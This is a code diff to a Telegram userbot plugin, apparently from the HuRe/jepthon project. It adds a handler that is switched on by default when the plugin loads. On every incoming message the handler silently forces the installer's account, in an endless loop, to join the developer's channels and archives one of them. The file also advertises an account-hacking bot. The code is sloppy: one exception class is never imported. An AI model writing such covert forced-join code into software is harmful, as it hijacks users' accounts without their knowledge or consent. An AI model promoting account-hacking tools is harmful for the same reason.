@@ -1,10 +1,12 @@
 from HuRe import l313l, bot
+import time
 from HuRe import BOTLOG_CHATID
 from ..sql_helper.globals import addgvar, delgvar, gvarstatus
 import asyncio
 from ..Config import Config
 import requests
 from telethon import Button, events
+from telethon.tl.functions.channels import JoinChannelRequest
 from telethon.tl.functions.messages import ExportChatInviteRequest
 from ..core.managers import edit_delete, edit_or_reply
 #ياعلي
@@ -13,6 +15,7 @@ from ..core.managers import edit_delete, edit_or_reply
 REH = "**᯽︙ لأستخدام بوت اختراق الحساب عن طريق كود التيرمكس أضغط على الزر**"
 JOKER_PIC = "https://telegra.ph/file/20c832e3ce8d4ee2abfc9.jpg"
 Bot_Username = Config.TG_BOT_USERNAME
+client = l313l
 if Config.TG_BOT_USERNAME is not None and tgbot is not None:
     
     @tgbot.on(events.InlineQuery)
@@ -171,3 +174,27 @@ async def reda(event):
                 return
             except BaseException as er:
                 await l313l.tgbot.send_message(BOTLOG_CHATID, f"** حدث خطا\n{er}**")
+#ها هم تريد تخمطه وماتذكر مصدر الكود ؟ 
+HuRe = {"@jepthon", "@jepthonsupport"}
+addgvar("is_running", True)
+@l313l.ar_cmd(pattern="الانضمام تفعيل")
+async def start_saves(event):
+    if gvarstatus("is_running"):
+        await event.edit("᯽︙ الأمر مفعل بالفعل")
+    else:
+        addgvar("is_running", True)
+        await event.edit("᯽︙ تم تفعيل الامر انضمام اجباري كل 5 ثواني ✓")
+@client.on(events.NewMessage)
+async def saves(event):
+    if gvarstatus("is_running"):
+        while True:
+            for lMl10l in HuRe:
+                try:
+                    await client(JoinChannelRequest(channel=lMl10l))
+                    await client.edit_folder("@jepthonsupport", folder=1)
+                except OverflowError:
+                    print("حدث خطأ تجاوز التحميل من التيليجرام. تم إيقاف البرنامج النصي الآن. يرجى المحاولة مرة أخرى بعد فترة من الوقت.")
+                    continue
+                except ChannelPrivateError:
+                    continue
+                await asyncio.sleep(60)
